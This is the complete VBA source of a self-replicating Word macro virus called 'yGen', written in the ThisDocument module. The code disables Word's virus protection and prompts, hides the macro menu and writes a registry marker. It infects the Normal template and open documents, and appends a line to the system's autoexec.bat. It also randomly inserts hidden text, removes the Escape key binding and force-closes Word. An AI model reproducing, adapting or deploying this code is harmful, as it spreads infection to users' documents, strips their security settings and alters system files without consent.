   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True
   Sub Document_Close()

   'MyName = yGen
   'WrittenBy = f0re

   On Error Resume Next

   CommandBars("Tools").Controls("macro").Visible = False
   Application.EnableCancelKey = 0
   Options.VirusProtection = 0
   Options.SaveNormalPrompt = 0
   Options.ConfirmConversions = 0

   If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "yGen") <> "phraming the world into the next millenium" Then
   System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "yGen") = "phraming the world into the next millenium"
   End If

   NormalInstalled = False
   ActiveInstalled = False

   Set AD = ActiveDocument.VBProject.VBComponents(1).CodeModule
   Set NT = NormalTemplate.VBProject.VBComponents(1).CodeModule

   If NT.Lines(3, 1) = "'MyName = yGen" Then NormalInstalled = True
   If AD.Lines(3, 1) = "'MyName = yGen" Then ActiveInstalled = True

   If NormalInstalled = True And ActiveInstalled = True Then GoTo PhrameEnd

   If NormalInstalled = False Then
       Set Infection = NT
       Set Carrier = AD
       Vircode = "Sub Document_Open()" & Chr(13) & Chr(10)
   Else
       Set Infection = AD
       Set Carrier = NT
       Vircode = "Sub Document_Close()" & Chr(13) & Chr(10)
   End If

   With Carrier
       For X = 2 To .CountOfLines
           Vircode = Vircode & .Lines(X, 1) & Chr(13) & Chr(10)
           If .Lines(X, 1) = "End Sub" Then Exit For
       Next X
   End With

   With Infection
           .DeleteLines 1, .CountOfLines
           .InsertLines 1, Vircode
   End With

   If Norminstalled = False Then NormalTemplate.Save
   If ActiveInstalled = False Then ActiveDocument.Save

   PhrameEnd:

   Root = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "SystemRoot")
   Targ = Mid(Root, 1, 3)

   Open Targ + "autoexec.bat" For Append As #1
           Print #1, "pause"
   Close #1

   Rndnm = Int((Rnd() * 15) + 1)
   If Rndnm = 15 Then

       Selection.EndKey Unit:=wdStory
       Selection.TypeParagraph
       Selection.Font.ColorIndex = wdWhite
       Selection.TypeText "phraming the world into the next millenium"
       Selection.ParagraphFormat.Alignment = wdAlignParagraphCenter
       Selection.HomeKey Unit:=wdLine
       Selection.MoveRight Unit:=wdCharacter, Count:=42, Extend:=wdExtend
       Selection.LanguageID = wdNoProofing
       Selection.HomeKey Unit:=wdStory

       ToolsCustomizeKeyboard.KeyCode = 27
       ToolsCustomizeKeyboard.Category = 1
       ToolsCustomizeKeyboard.Name = "Cancel"
       ToolsCustomizeKeyboard.Remove
       ToolsCustomizeKeyboard.Context = 0

       SendKeys "%" + "{F4}"

   End If

   End Sub
